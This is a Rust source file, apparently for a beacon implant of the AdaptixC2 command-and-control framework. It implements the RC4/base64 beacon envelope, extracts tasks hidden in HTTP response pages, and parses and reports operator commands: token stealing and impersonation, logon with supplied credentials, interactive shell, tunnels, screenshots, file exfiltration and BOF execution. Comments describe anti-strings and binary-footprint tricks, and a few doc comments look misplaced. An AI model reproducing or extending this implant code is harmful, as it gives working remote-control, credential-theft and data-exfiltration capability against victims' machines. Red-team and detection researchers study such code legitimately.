//! HTTP transport shaping for the AdaptixC2 `BeaconHTTP` listener (v1.2,
//! docs/WIRE.md): the pure halves of the transaction — the RC4+base64 beat
//! envelope of the request header, the page-template payload extraction and
//! task-pack parsing of the response, and the framed task-result body.
//!
//! Pinned against the server source (`beacon_listener_http/pl_transport.go`,
//! `beacon_agent/pl_main.go`/`pl_packer.go`, tag v1.2) by tests replaying
//! vectors produced by the exact Go semantics (crypto/rc4, base64, PackArray,
//! PackTasks). The WinHTTP glue that carries these bytes lives in the beacon
//! crate (`runtime::winhttp`); everything here is pure and bounded.

use crate::beat::BeatData;
use crate::rc4::Rc4;
use crate::wire::{Reader, Writer};

/// Standard base64 alphabet (Go `base64.StdEncoding`), with padding.
/// A runtime literal declared in the anti-strings manifest.
const B64: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

/// Base64 (std, padded) encode into `dst`; `None` if it does not fit.
pub fn base64_encode(src: &[u8], dst: &mut [u8]) -> Option<usize> {
    let need = src.len().div_ceil(3) * 4;
    if dst.len() < need {
        return None;
    }
    let mut si = 0usize;
    let mut di = 0usize;
    while si + 3 <= src.len() {
        let n = ((src[si] as u32) << 16) | ((src[si + 1] as u32) << 8) | src[si + 2] as u32;
        dst[di] = B64[(n >> 18) as usize & 63];
        dst[di + 1] = B64[(n >> 12) as usize & 63];
        dst[di + 2] = B64[(n >> 6) as usize & 63];
        dst[di + 3] = B64[n as usize & 63];
        si += 3;
        di += 4;
    }
    let rem = src.len() - si;
    if rem == 1 {
        let n = (src[si] as u32) << 16;
        dst[di] = B64[(n >> 18) as usize & 63];
        dst[di + 1] = B64[(n >> 12) as usize & 63];
        dst[di + 2] = b'=';
        dst[di + 3] = b'=';
        di += 4;
    } else if rem == 2 {
        let n = ((src[si] as u32) << 16) | ((src[si + 1] as u32) << 8);
        dst[di] = B64[(n >> 18) as usize & 63];
        dst[di + 1] = B64[(n >> 12) as usize & 63];
        dst[di + 2] = B64[(n >> 6) as usize & 63];
        dst[di + 3] = b'=';
        di += 4;
    }
    Some(di)
}

/// Build the beat header value (listener `hb_header`):
/// `base64( RC4(listener_key, u32 BE watermark || u32 BE agent_id || beat) )`.
///
/// `scratch` holds the plaintext envelope during the call (must fit
/// `8 + beat size`); returns the encoded length in `out`.
pub fn beat_header(
    beat: &BeatData,
    listener_key: &[u8],
    watermark: u32,
    agent_id: u32,
    scratch: &mut [u8],
    out: &mut [u8],
) -> Option<usize> {
    let mut w = Writer::new(scratch);
    if !w.u32(watermark) || !w.u32(agent_id) || !crate::beat::write_beat(&mut w, beat) {
        return None;
    }
    let len = w.written();
    Rc4::new(listener_key).crypt_in_place(&mut scratch[..len]);
    base64_encode(&scratch[..len], out)
}

/// Byte range of the encrypted payload inside a response page (see
/// `extract_payload`); the range form lets the caller decrypt in place.
///
/// Manual comparisons (never `starts_with`/`ends_with`: they lower to a
/// `memcmp` reference, and one reference pulls the whole LTO-fused
/// compiler_builtins object into the blob — the same rule as manual copies).
pub fn extract_payload_range(page: &[u8], prepend: &[u8], append: &[u8]) -> Option<(usize, usize)> {
    if page.len() < prepend.len() + append.len() {
        return None;
    }
    let mut i = 0usize;
    while i < prepend.len() {
        if page[i] != prepend[i] {
            return None;
        }
        i += 1;
    }
    let mut i = 0usize;
    while i < append.len() {
        if page[page.len() - append.len() + i] != append[i] {
            return None;
        }
        i += 1;
    }
    Some((prepend.len(), page.len() - append.len()))
}

/// Extract the encrypted task payload from a response page: the listener
/// substitutes `<<<PAYLOAD_DATA>>>` inside its `page-payload` template, so
/// the page is exactly `prepend || payload || append`. Empty payload = no
/// tasks hosted.
pub fn extract_payload<'a>(page: &'a [u8], prepend: &[u8], append: &[u8]) -> Option<&'a [u8]> {
    let (start, end) = extract_payload_range(page, prepend, append)?;
    Some(&page[start..end])
}

/// Server task pack command ids (native `beacon_agent`, pl_utils.go).
pub const COMMAND_TERMINATE: u32 = 10;
pub const COMMAND_PROFILE: u32 = 21;
pub const COMMAND_PWD: u32 = 4;
pub const COMMAND_CD: u32 = 8;
pub const COMMAND_LS: u32 = 14;
pub const COMMAND_CAT: u32 = 24;
pub const COMMAND_MKDIR: u32 = 27;
pub const COMMAND_RM: u32 = 17;
pub const COMMAND_COPY: u32 = 12;
pub const COMMAND_MV: u32 = 18;
pub const COMMAND_GETUID: u32 = 22;
pub const COMMAND_DISKS: u32 = 15;
pub const COMMAND_PS_LIST: u32 = 41;
pub const COMMAND_PS_KILL: u32 = 42;
/// `ps run` (native beacon_agent Commander.cpp CmdPsRun): start a program,
/// optionally capture its stdout through a job.
pub const COMMAND_PS_RUN: u32 = 43;
/// Job lifecycle/output records (native JobsController: taskId of the
/// original task, then the job type and state, then the drained output).
pub const COMMAND_JOB: u32 = 0x8437;
pub const COMMAND_JOB_LIST: u32 = 46;
pub const COMMAND_JOBS_KILL: u32 = 47;
/// Native JOB_TYPE_* / JOB_STATE_* (JobsController.h).
pub const JOB_TYPE_PROCESS: u8 = 0x3;
pub const JOB_TYPE_SHELL: u8 = 0x4;
pub const JOB_STATE_STARTING: u8 = 0x0;
pub const JOB_STATE_RUNNING: u8 = 0x1;
pub const JOB_STATE_FINISHED: u8 = 0x2;
pub const JOB_STATE_KILLED: u8 = 0x3;
pub const COMMAND_DOWNLOAD: u32 = 32;
pub const COMMAND_UPLOAD: u32 = 33;
pub const COMMAND_EXFIL: u32 = 35;
/// Screenshot capture (free id in the native numbering — the 41-47
/// neighborhood is ps/jobs). The beacon captures the screen into a heap
/// buffer at task time, then streams the BMP across cycles exactly like a
/// download (the POST body frame is 0x12000, a full-screen BMP is ~7 MiB).
pub const COMMAND_SCREENSHOT: u32 = 44;
/// Token manipulation (free ids in the native numbering — the 48-61 range
/// is unused by beacon_agent; 50/51 are the BOF pair). Port of the native
/// token.c: steal/make/impersonate/revert/list/remove/getuid/privs.
pub const COMMAND_TOKEN_STEAL: u32 = 52;
pub const COMMAND_TOKEN_MAKE: u32 = 53;
pub const COMMAND_TOKEN_IMPRS: u32 = 54;
pub const COMMAND_TOKEN_REVERT: u32 = 55;
pub const COMMAND_TOKEN_LIST: u32 = 56;
pub const COMMAND_TOKEN_REMOVE: u32 = 57;
pub const COMMAND_TOKEN_GETUID: u32 = 58;
pub const COMMAND_TOKEN_PRIVS: u32 = 59;
/// Interactive shell (native beacon_agent numbering — the client's
/// terminal drives Start/Write, close rides `jobs kill`).
pub const COMMAND_SHELL_START: u32 = 71;
pub const COMMAND_SHELL_WRITE: u32 = 72;
/// Tunnels (native beacon_agent numbering; UDP — 63/65 — is not
/// implemented, like the original specter's tunnel.c which is
/// TCP-only). Tasks arrive through TunnelCallbacks (PROXY_DATA), the
/// per-connection I/O rides TUNNEL_START/WRITE/CLOSE/ACCEPT records.
pub const COMMAND_TUNNEL_START_TCP: u32 = 62;
pub const COMMAND_TUNNEL_WRITE_TCP: u32 = 64;
pub const COMMAND_TUNNEL_CLOSE: u32 = 66;
pub const COMMAND_TUNNEL_REVERSE: u32 = 67;
pub const COMMAND_TUNNEL_ACCEPT: u32 = 68;
pub const COMMAND_TUNNEL_PAUSE: u32 = 69;
pub const COMMAND_TUNNEL_RESUME: u32 = 70;
/// Screenshot stream states (COMMAND_SCREENSHOT result byte).
pub const SCREENSHOT_START: u8 = 1;
pub const SCREENSHOT_CONTINUE: u8 = 2;
pub const SCREENSHOT_FINISH: u8 = 3;
/// Server-side memory chunking of upload payloads (docs/WIRE.md).
pub const COMMAND_SAVEMEMORY: u32 = 0x2321;
/// BOF execution (native beacon_agent `execute bof`, pl_utils.go).
pub const COMMAND_EXEC_BOF: u32 = 50;
/// BOF output/error records (native COMMAND_EXEC_BOF_OUT).
pub const COMMAND_EXEC_BOF_OUT: u32 = 51;

/// COMMAND_EXEC_BOF result byte: async BOF started (Completed=false).
pub const BOF_STATE_STARTED: u8 = 1;
/// COMMAND_EXEC_BOF result byte: BOF finished (Completed=true).
pub const BOF_STATE_FINISHED: u8 = 2;

/// COMMAND_EXEC_BOF_OUT callback types (native pl_utils.go).
pub const CALLBACK_ERROR: u32 = 0x0d;
pub const CALLBACK_OUTPUT_OEM: u32 = 0x1e;
pub const CALLBACK_OUTPUT_UTF8: u32 = 0x20;
/// BOF load error types, reported through COMMAND_EXEC_BOF_OUT.
pub const BOF_ERROR_PARSE: u32 = 0x101;
pub const BOF_ERROR_SYMBOL: u32 = 0x102;
pub const BOF_ERROR_MAX_FUNCS: u32 = 0x103;
pub const BOF_ERROR_ENTRY: u32 = 0x104;
pub const BOF_ERROR_ALLOC: u32 = 0x105;

/// Download progress states (native pl_utils.go).
pub const DOWNLOAD_START: u8 = 1;
pub const DOWNLOAD_CONTINUE: u8 = 2;
pub const DOWNLOAD_FINISH: u8 = 3;

/// Exfil/download session states (axc2 SDK).
pub const EXFIL_RUNNING: u8 = 1;
pub const EXFIL_STOPPED: u8 = 2;
pub const EXFIL_FINISHED: u8 = 3;
pub const EXFIL_CANCELED: u8 = 4;
/// Beacon-side error report: `{COMMAND_ERROR, win32 error code}`.
pub const COMMAND_ERROR: u32 = 0x1111_FFFF;

/// Longest path the beacon carries (MAX_PATH); one buffer per task.
pub const PATH_CAP: usize = 260;
/// Longest credential field of `tkn make` (the native token.c caps at 128).
pub const TOKEN_FIELD_CAP: usize = 128;
/// Longest shell program path (`shell start`).
pub const SHELL_PROG_CAP: usize = 128;
/// Longest shell input write (typed characters — terminal-sized).
pub const SHELL_INPUT_CAP: usize = 512;
/// Longest tunnel address (socks/lportfwd targets).
pub const TUNNEL_ADDR_CAP: usize = 128;

/// A parsed server task (the commands the beacon can delimit and execute;
/// anything else in the pack stops the parse — the server keeps unprocessed
/// tasks hosted and resends them).
///
/// The tunnel write carries its 16 KiB payload inline (no allocation in
/// the beacon): the variant size difference is accepted deliberately.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
#[allow(clippy::large_enum_variant)]
pub enum Task {
    /// `COMMAND_PROFILE` subop 1: sleep seconds + jitter percent.
    Sleep { sec: u32, jitter_pct: u32 },
    /// `COMMAND_TERMINATE`: silent exit.
    Terminate,
    /// `COMMAND_PWD`: current working directory.
    Pwd,
    /// `COMMAND_CD` with the target path (ACP bytes).
    Cd { path_len: u16, path: [u8; PATH_CAP] },
    /// `COMMAND_LS` with the directory to list.
    Ls { path_len: u16, path: [u8; PATH_CAP] },
    /// `COMMAND_CAT` with the file to read.
    Cat { path_len: u16, path: [u8; PATH_CAP] },
    /// `COMMAND_MKDIR` with the directory to create.
    Mkdir { path_len: u16, path: [u8; PATH_CAP] },
    /// `COMMAND_RM` with the file or directory to delete.
    Rm { path_len: u16, path: [u8; PATH_CAP] },
    /// `COMMAND_COPY` with source and destination.
    Cp {
        src_len: u16,
        src: [u8; PATH_CAP],
        dst_len: u16,
        dst: [u8; PATH_CAP],
    },
    /// `COMMAND_MV` with source and destination.
    Mv {
        src_len: u16,
        src: [u8; PATH_CAP],
        dst_len: u16,
        dst: [u8; PATH_CAP],
    },
    /// `COMMAND_GETUID`: the current token's identity.
    Getuid,
    /// `COMMAND_DISKS`: the mounted drives.
    Disks,
    /// `COMMAND_PS_LIST`: the process listing.
    PsList,
    /// `COMMAND_PS_KILL` with the target pid.
    PsKill { pid: u32 },
    /// `COMMAND_PS_RUN` with the capture flag, the creation state
    /// (0 normal, 4 suspended) and the full command line.
    PsRun {
        output: bool,
        prog_state: u32,
        args_len: u16,
        args: [u8; PATH_CAP],
    },
    /// `COMMAND_JOB_LIST`: enumerate the live jobs.
    JobsList,
    /// `COMMAND_JOBS_KILL` with the job id (the original task id).
    JobsKill { job_id: u32 },
    /// `COMMAND_DOWNLOAD` with the file to stream.
    Download { path_len: u16, path: [u8; PATH_CAP] },
    /// `COMMAND_UPLOAD` with the memory id and the destination path.
    Upload {
        memory_id: u32,
        path_len: u16,
        path: [u8; PATH_CAP],
    },
    /// `COMMAND_EXFIL` with the state and the download id.
    Exfil { action: u8, file_id: u32 },
    /// `COMMAND_SCREENSHOT`: capture the screen (no arguments).
    Screenshot,
    /// `COMMAND_TOKEN_STEAL` with the target pid.
    TokenSteal { pid: u32 },
    /// `COMMAND_TOKEN_MAKE` with the logon type and the credentials
    /// (ACP bytes, pack-string each).
    TokenMake {
        logon_type: u32,
        domain_len: u16,
        domain: [u8; TOKEN_FIELD_CAP],
        user_len: u16,
        user: [u8; TOKEN_FIELD_CAP],
        pass_len: u16,
        pass: [u8; TOKEN_FIELD_CAP],
    },
    /// `COMMAND_TOKEN_IMPRS` with the stored token id.
    TokenImpersonate { token_id: u32 },
    /// `COMMAND_TOKEN_REVERT`.
    TokenRevert,
    /// `COMMAND_TOKEN_LIST`.
    TokenList,
    /// `COMMAND_TOKEN_REMOVE` with the stored token id.
    TokenRemove { token_id: u32 },
    /// `COMMAND_TOKEN_GETUID`: the identity of the CURRENT (thread) token.
    TokenGetuid,
    /// `COMMAND_TOKEN_PRIVS`: the current token's privileges.
    TokenPrivs,
    /// `COMMAND_SHELL_START` with the terminal id and the program (ACP
    /// bytes; empty = the cmd.exe default).
    ShellStart {
        terminal_id: u32,
        program_len: u16,
        program: [u8; SHELL_PROG_CAP],
    },
    /// `COMMAND_SHELL_WRITE` with the terminal id and the raw input bytes.
    ShellWrite {
        terminal_id: u32,
        data_len: u16,
        data: [u8; SHELL_INPUT_CAP],
    },
    /// `COMMAND_TUNNEL_START_TCP` with the channel id, the tunnel type
    /// (socks/lportfwd — informational), the target address and port.
    TunnelStartTcp {
        channel_id: u32,
        addr_len: u16,
        addr: [u8; TUNNEL_ADDR_CAP],
        port: u32,
    },
    /// `COMMAND_TUNNEL_WRITE_TCP` with the channel id and the raw data.
    /// `COMMAND_TUNNEL_CLOSE` with the channel id.
    TunnelClose { channel_id: u32 },
    /// `COMMAND_TUNNEL_PAUSE` with the channel id.
    TunnelPause { channel_id: u32 },
    /// `COMMAND_TUNNEL_RESUME` with the channel id.
    TunnelResume { channel_id: u32 },
    /// `COMMAND_TUNNEL_REVERSE` (rportfwd) with the tunnel id and the
    /// listen port.
    TunnelReverse { tunnel_id: u32, port: u32 },
}

impl Task {
    /// The primary path argument of any path-carrying task (for Cp/Mv:
    /// the source).
    pub fn path(&self) -> &[u8] {
        match self {
            Task::Cd { path_len, path }
            | Task::Ls { path_len, path }
            | Task::Cat { path_len, path }
            | Task::Mkdir { path_len, path }
            | Task::Rm { path_len, path }
            | Task::Download { path_len, path }
            | Task::Upload { path_len, path, .. } => &path[..*path_len as usize],
            Task::Cp { src_len, src, .. } | Task::Mv { src_len, src, .. } => {
                &src[..*src_len as usize]
            }
            _ => &[],
        }
    }

    /// The destination of Cp/Mv (empty elsewhere).
    pub fn dst(&self) -> &[u8] {
        match self {
            Task::Cp { dst_len, dst, .. } | Task::Mv { dst_len, dst, .. } => {
                &dst[..*dst_len as usize]
            }
            _ => &[],
        }
    }
}

/// PackArray string argument: `u32 LE length (incl. the NUL) || bytes ||
/// NUL` (the task-arg encoding — not the BE array wire form).
fn pack_string(r: &mut Reader) -> Option<(u16, [u8; PATH_CAP])> {
    pack_string_cap::<PATH_CAP>(r)
}

/// Bounded pack-string parse: the Go `PackArray` string is
/// `u32 LE len-incl-NUL || bytes || NUL`; the trailing NUL is separator.
fn pack_string_cap<const CAP: usize>(r: &mut Reader) -> Option<(u16, [u8; CAP])> {
    let len = r.u32_le()? as usize;
    if len == 0 || len > CAP {
        return None;
    }
    let bytes = r.take(len)?;
    let mut buf = [0u8; CAP];
    let mut i = 0;
    while i < bytes.len() {
        buf[i] = bytes[i];
        i += 1;
    }
    // Trailing NUL is separator, not data.
    let mut n = bytes.len();
    while n > 0 && buf[n - 1] == 0 {
        n -= 1;
    }
    Some((n as u16, buf))
}

/// Parse one task record `[u32 LE commandId || args || u32 LE taskId]`.
/// `None` = unknown command or truncated record.
pub fn parse_task(r: &mut Reader) -> Option<(Task, u32)> {
    let command = r.u32_le()?;
    let task = match command {
        COMMAND_PROFILE => {
            // Same PackArray layout the server's CreateCommand emits for
            // "sleep": {COMMAND_PROFILE, 1, sleepTime, jitterTime}.
            let subop = r.u32_le()?;
            if subop != 1 {
                return None;
            }
            let sec = r.u32_le()?;
            let jitter_pct = r.u32_le()?;
            Task::Sleep { sec, jitter_pct }
        }
        // COMMAND_TERMINATE carries the exit method (1 = kill thread,
        // 2 = kill process) before the task id.
        COMMAND_TERMINATE => {
            let _exit_method = r.u32_le()?;
            Task::Terminate
        }
        COMMAND_PWD => Task::Pwd,
        COMMAND_CD => {
            let (path_len, path) = pack_string(r)?;
            Task::Cd { path_len, path }
        }
        COMMAND_LS => {
            let (path_len, path) = pack_string(r)?;
            Task::Ls { path_len, path }
        }
        COMMAND_CAT => {
            let (path_len, path) = pack_string(r)?;
            Task::Cat { path_len, path }
        }
        COMMAND_MKDIR => {
            let (path_len, path) = pack_string(r)?;
            Task::Mkdir { path_len, path }
        }
        COMMAND_RM => {
            let (path_len, path) = pack_string(r)?;
            Task::Rm { path_len, path }
        }
        COMMAND_COPY | COMMAND_MV => {
            let (src_len, src) = pack_string(r)?;
            let (dst_len, dst) = pack_string(r)?;
            if command == COMMAND_COPY {
                Task::Cp {
                    src_len,
                    src,
                    dst_len,
                    dst,
                }
            } else {
                Task::Mv {
                    src_len,
                    src,
                    dst_len,
                    dst,
                }
            }
        }
        COMMAND_GETUID => Task::Getuid,
        COMMAND_DISKS => Task::Disks,
        COMMAND_PS_LIST => Task::PsList,
        COMMAND_PS_KILL => {
            let pid = r.u32_le()?;
            Task::PsKill { pid }
        }
        COMMAND_DOWNLOAD => {
            let (path_len, path) = pack_string(r)?;
            Task::Download { path_len, path }
        }
        COMMAND_UPLOAD => {
            let memory_id = r.u32_le()?;
            let (path_len, path) = pack_string(r)?;
            Task::Upload {
                memory_id,
                path_len,
                path,
            }
        }
        COMMAND_EXFIL => {
            // The server (native PackArray) writes the state as a full
            // int (u32 LE) - reading it as a byte desynchronized the
            // parse by 3 bytes and the download id never matched (the
            // exfil stop was silently lost, observed live in iteration 16).
            let action = r.u32_le()? as u8;
            let file_id = r.u32_le()?;
            Task::Exfil { action, file_id }
        }
        COMMAND_PS_RUN => {
            // Native CmdPsUnpack order: byte progOutput, byte useToken,
            // int progState, array progArgs. The token flag is parsed and
            // ignored (no stored-token infrastructure yet - MVP).
            let output = r.u8()? != 0;
            let _use_token = r.u8()?;
            let prog_state = r.u32_le()?;
            let (args_len, args) = pack_string(r)?;
            Task::PsRun {
                output,
                prog_state,
                args_len,
                args,
            }
        }
        COMMAND_JOB_LIST => Task::JobsList,
        COMMAND_JOBS_KILL => {
            let job_id = r.u32_le()?;
            Task::JobsKill { job_id }
        }
        COMMAND_SCREENSHOT => Task::Screenshot,
        COMMAND_TOKEN_STEAL => {
            let pid = r.u32_le()?;
            Task::TokenSteal { pid }
        }
        COMMAND_TOKEN_MAKE => {
            let logon_type = r.u32_le()?;
            let (domain_len, domain) = pack_string_cap::<TOKEN_FIELD_CAP>(r)?;
            let (user_len, user) = pack_string_cap::<TOKEN_FIELD_CAP>(r)?;
            let (pass_len, pass) = pack_string_cap::<TOKEN_FIELD_CAP>(r)?;
            Task::TokenMake {
                logon_type,
                domain_len,
                domain,
                user_len,
                user,
                pass_len,
                pass,
            }
        }
        COMMAND_TOKEN_IMPRS => {
            let token_id = r.u32_le()?;
            Task::TokenImpersonate { token_id }
        }
        COMMAND_TOKEN_REVERT => Task::TokenRevert,
        COMMAND_TOKEN_LIST => Task::TokenList,
        COMMAND_TOKEN_REMOVE => {
            let token_id = r.u32_le()?;
            Task::TokenRemove { token_id }
        }
        COMMAND_TOKEN_GETUID => Task::TokenGetuid,
        COMMAND_TOKEN_PRIVS => Task::TokenPrivs,
        COMMAND_SHELL_START => {
            let terminal_id = r.u32_le()?;
            // The program is a pack string that MAY be empty (cmd.exe
            // default) — parse the length manually, pack_string rejects
            // zero.
            let len = r.u32_le()? as usize;
            if len > SHELL_PROG_CAP {
                return None;
            }
            let bytes = r.take(len)?;
            let mut program = [0u8; SHELL_PROG_CAP];
            let mut i = 0;
            while i < bytes.len() {
                program[i] = bytes[i];
                i += 1;
            }
            // Trailing NUL is separator, not data.
            let mut n = bytes.len();
            while n > 0 && program[n - 1] == 0 {
                n -= 1;
            }
            Task::ShellStart {
                terminal_id,
                program_len: n as u16,
                program,
            }
        }
        COMMAND_SHELL_WRITE => {
            let terminal_id = r.u32_le()?;
            // The native packs `int len || raw bytes` ([]byte appends
            // without a prefix in PackArray).
            let len = r.u32_le()? as usize;
            if len > SHELL_INPUT_CAP {
                return None;
            }
            let bytes = r.take(len)?;
            let mut data = [0u8; SHELL_INPUT_CAP];
            let mut i = 0;
            while i < bytes.len() {
                data[i] = bytes[i];
                i += 1;
            }
            Task::ShellWrite {
                terminal_id,
                data_len: bytes.len() as u16,
                data,
            }
        }
        COMMAND_TUNNEL_START_TCP => {
            let channel_id = r.u32_le()?;
            let _tunnel_type = r.u32_le()?;
            let (addr_len, addr) = pack_string_cap::<TUNNEL_ADDR_CAP>(r)?;
            let port = r.u32_le()?;
            Task::TunnelStartTcp {
                channel_id,
                addr_len,
                addr,
                port,
            }
        }
        COMMAND_TUNNEL_CLOSE => {
            let channel_id = r.u32_le()?;
            Task::TunnelClose { channel_id }
        }
        COMMAND_TUNNEL_PAUSE => {
            let channel_id = r.u32_le()?;
            Task::TunnelPause { channel_id }
        }
        COMMAND_TUNNEL_RESUME => {
            let channel_id = r.u32_le()?;
            Task::TunnelResume { channel_id }
        }
        COMMAND_TUNNEL_REVERSE => {
            let tunnel_id = r.u32_le()?;
            let port = r.u32_le()?;
            Task::TunnelReverse { tunnel_id, port }
        }
        _ => return None,
    };
    let id = r.u32_le()?;
    Some((task, id))
}

/// Begin a results pack: reserve the `u32 BE size` the server's ProcessData
/// checks (`size - 4 == remaining`).
pub fn begin_results(w: &mut Writer) -> bool {
    w.u32(0)
}

/// Backfill the reserved size (`4 + body`).
pub fn finish_results(w: &mut Writer) -> bool {
    if w.written() < 4 {
        return false;
    }
    let total = w.written() as u32;
    w.backfill_u32_be(0, total);
    true
}

/// MKDIR result: `array path` (the created directory).
pub fn push_mkdir_result(w: &mut Writer, task_id: u32, path: &[u8]) -> bool {
    push_result_header(w, task_id, COMMAND_MKDIR) && w.array(path)
}

/// RM result: `byte 0` (file deleted) or `byte 1` (directory removed).
pub fn push_rm_result(w: &mut Writer, task_id: u32, was_dir: bool) -> bool {
    push_result_header(w, task_id, COMMAND_RM) && w.u8(u8::from(was_dir))
}

/// CP/MV result: the header alone — the server renders the fixed message.
/// A SAVEMEMORY chunk: `[COMMAND_SAVEMEMORY, memoryId, bufferSize,
/// chunkLen, chunk]` followed by the `u32 LE taskId` every task record
/// carries — the borrowed chunk must be consumed before the response
/// buffer moves. Returns `(memoryId, expected total, chunk)`.
pub fn parse_save_memory<'a>(r: &mut Reader<'a>) -> Option<(u32, usize, &'a [u8])> {
    let command = r.u32_le()?;
    if command != COMMAND_SAVEMEMORY {
        return None;
    }
    let memory_id = r.u32_le()?;
    let expected = r.u32_le()? as usize;
    let chunk_len = r.u32_le()? as usize;
    let chunk = r.take(chunk_len)?;
    let _task_id = r.u32_le()?;
    Some((memory_id, expected, chunk))
}

/// One parsed `execute bof` task. The BOF image and its argument blob are
/// borrowed from the response buffer — the task must be executed inline,
/// like SAVEMEMORY, before the buffer is reused.
pub struct BofTask<'a> {
    /// `-a`: run detached (the beacon reports start, then runs it).
    pub async_flag: bool,
    /// Entry symbol name, NUL-stripped (`entry_len` bytes).
    pub entry: [u8; 64],
    pub entry_len: u16,
    /// The COFF image bytes.
    pub bof: &'a [u8],
    /// The argument blob passed to the entry (`args ptr, argslen`).
    pub args: &'a [u8],
    pub task_id: u32,
}

impl BofTask<'_> {
    pub fn entry_name(&self) -> &[u8] {
        &self.entry[..self.entry_len as usize]
    }
}

/// Parse one `execute bof` task record (the PackArray layout the server's
/// CreateCommand emits: `{50, async byte, "go", len, bof, len, params}` as
/// `[u32 LE 50 || u8 async || pack_string entry || u32 LE len || bof
/// || u32 LE len || params || u32 LE taskId]`). The borrowed slices point
/// into the reader's buffer — inline execution only.
/// `COMMAND_TUNNEL_WRITE_TCP` parsed inline (the data borrows the
/// response buffer — never inline in the Task enum: a big Copy variant
/// chokes the clean-build codegen, the whole module is ICF'd away;
/// SAVEMEMORY/EXEC_BOF use the same borrowing pattern).
pub fn parse_tunnel_write<'a>(r: &mut Reader<'a>) -> Option<(u32, &'a [u8])> {
    let command = r.u32_le()?;
    if command != COMMAND_TUNNEL_WRITE_TCP {
        return None;
    }
    let channel_id = r.u32_le()?;
    let len = r.u32_le()? as usize;
    let data = r.take(len)?;
    let _task_id = r.u32_le()?;
    Some((channel_id, data))
}

pub fn parse_exec_bof<'a>(r: &mut Reader<'a>) -> Option<BofTask<'a>> {
    let command = r.u32_le()?;
    if command != COMMAND_EXEC_BOF {
        return None;
    }
    let async_flag = r.u8()? != 0;
    // Entry name: pack_string semantics (u32 LE len incl. the NUL).
    let len = r.u32_le()? as usize;
    if len == 0 || len > 64 {
        return None;
    }
    let bytes = r.take(len)?;
    let mut entry = [0u8; 64];
    let mut i = 0;
    while i < bytes.len() {
        entry[i] = bytes[i];
        i += 1;
    }
    let mut n = bytes.len();
    while n > 0 && entry[n - 1] == 0 {
        n -= 1;
    }
    let entry_len = n as u16;
    // BOF image: u32 LE length + bytes (PackArray `int len` + raw bytes).
    let bof_len = r.u32_le()? as usize;
    let bof = r.take(bof_len)?;
    // Argument blob: same layout; the trailing NUL stays in the blob —
    // BeaconData* length comes from the task, not the string form.
    let args_len = r.u32_le()? as usize;
    let args = r.take(args_len)?;
    let task_id = r.u32_le()?;
    Some(BofTask {
        async_flag,
        entry,
        entry_len,
        bof,
        args,
        task_id,
    })
}

/// COMMAND_EXEC_BOF lifecycle record: `u32 BE taskId || u32 BE 50
/// || u8 state` (1 = started, Completed=false; 2 = finished,
/// Completed=true).
pub fn push_bof_lifecycle(w: &mut Writer, task_id: u32, state: u8) -> bool {
    push_result_header(w, task_id, COMMAND_EXEC_BOF) && w.u8(state)
}

/// COMMAND_EXEC_BOF_OUT record: `u32 BE taskId || u32 BE 51
/// || u32 BE outputType || array output`. Error types carry the failing
/// symbol name ("Symbol not found: X" server-side); callbacks carry the
/// BOF's printed text.
pub fn push_bof_output(w: &mut Writer, task_id: u32, output_type: u32, output: &[u8]) -> bool {
    push_result_header(w, task_id, COMMAND_EXEC_BOF_OUT) && w.u32(output_type) && w.array(output)
}

/// DOWNLOAD progress record: `int fileId || byte state` then per state:
/// START `long size || array name`, CONTINUE `array chunk`, FINISH ``.
pub fn push_download_start(
    w: &mut Writer,
    task_id: u32,
    file_id: u32,
    size: u64,
    name: &[u8],
) -> bool {
    push_result_header(w, task_id, COMMAND_DOWNLOAD)
        && w.u32(file_id)
        && w.u8(DOWNLOAD_START)
        && w.u64(size)
        && w.array(name)
}

pub fn push_download_continue(w: &mut Writer, task_id: u32, file_id: u32, chunk: &[u8]) -> bool {
    push_result_header(w, task_id, COMMAND_DOWNLOAD)
        && w.u32(file_id)
        && w.u8(DOWNLOAD_CONTINUE)
        && w.array(chunk)
}

pub fn push_download_finish(w: &mut Writer, task_id: u32, file_id: u32) -> bool {
    push_result_header(w, task_id, COMMAND_DOWNLOAD) && w.u32(file_id) && w.u8(DOWNLOAD_FINISH)
}

/// SCREENSHOT stream records (the capture lives in a beacon heap buffer,
/// streamed one chunk per cycle like a download; the server reassembles by
/// task id and hands the full BMP to `TsScreenshotAdd`).
pub fn push_screenshot_start(w: &mut Writer, task_id: u32, size: u64) -> bool {
    push_result_header(w, task_id, COMMAND_SCREENSHOT) && w.u8(SCREENSHOT_START) && w.u64(size)
}

pub fn push_screenshot_continue(w: &mut Writer, task_id: u32, chunk: &[u8]) -> bool {
    push_result_header(w, task_id, COMMAND_SCREENSHOT)
        && w.u8(SCREENSHOT_CONTINUE)
        && w.array(chunk)
}

pub fn push_screenshot_finish(w: &mut Writer, task_id: u32) -> bool {
    push_result_header(w, task_id, COMMAND_SCREENSHOT) && w.u8(SCREENSHOT_FINISH)
}

/// TOKEN_STEAL result: `int tokenId || int pid || array domain || array user`
/// (BE) — the server renders "Token %v stolen from pid %v (%s\%s)".
pub fn push_token_steal_result(
    w: &mut Writer,
    task_id: u32,
    token_id: u32,
    pid: u32,
    domain: &[u8],
    user: &[u8],
) -> bool {
    push_result_header(w, task_id, COMMAND_TOKEN_STEAL)
        && w.u32(token_id)
        && w.u32(pid)
        && w.array(domain)
        && w.array(user)
}

/// TOKEN_MAKE result: `int tokenId` (BE).
pub fn push_token_make_result(w: &mut Writer, task_id: u32, token_id: u32) -> bool {
    push_result_header(w, task_id, COMMAND_TOKEN_MAKE) && w.u32(token_id)
}

/// TOKEN impersonate/revert ack: `byte ok` (BE record).
pub fn push_token_ack(w: &mut Writer, task_id: u32, command_id: u32, ok: bool) -> bool {
    push_result_header(w, task_id, command_id) && w.u8(u8::from(ok))
}

/// TOKEN_LIST result: `int count`, then per entry
/// `int tokenId || int pid || array domain || array user` (BE).
pub fn push_token_list_header(w: &mut Writer, task_id: u32, count: u32) -> bool {
    push_result_header(w, task_id, COMMAND_TOKEN_LIST) && w.u32(count)
}

pub fn push_token_list_entry(
    w: &mut Writer,
    token_id: u32,
    pid: u32,
    domain: &[u8],
    user: &[u8],
) -> bool {
    w.u32(token_id) && w.u32(pid) && w.array(domain) && w.array(user)
}

/// TOKEN_GETUID result: `array "DOMAIN\User"` (BE).
pub fn push_token_getuid_result(w: &mut Writer, task_id: u32, uid: &[u8]) -> bool {
    push_result_header(w, task_id, COMMAND_TOKEN_GETUID) && w.array(uid)
}

